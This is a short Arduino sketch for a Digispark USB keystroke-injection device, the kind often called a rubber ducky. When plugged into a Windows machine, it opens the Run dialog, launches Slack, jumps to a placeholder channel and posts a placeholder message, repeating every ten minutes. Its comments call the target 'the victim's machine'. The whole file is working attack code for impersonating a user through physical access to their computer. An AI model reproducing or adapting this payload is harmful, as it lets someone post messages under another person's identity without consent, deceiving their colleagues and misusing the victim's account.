#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);

  // send <Windows> + R to open run
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // change main window to slack (assuming slack is running in the background)
  DigiKeyboard.print("%USERPROFILE%\AppData\Local\slack\slack.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500); // if slack might be off on the victim's machine, increase this value (app startup time)
  
  // select channel to write a message on
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, KEY_K);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("CHANGE_ME_CHANNEL"); // channel name goes here
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  // prepare and send the message
  DigiKeyboard.print("CHANGE_ME_MESSAGE"); // message goes here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Delay to disconnect before payload execs again (600000 milliseconds == 10 minutes)
  DigiKeyboard.delay(600000);
}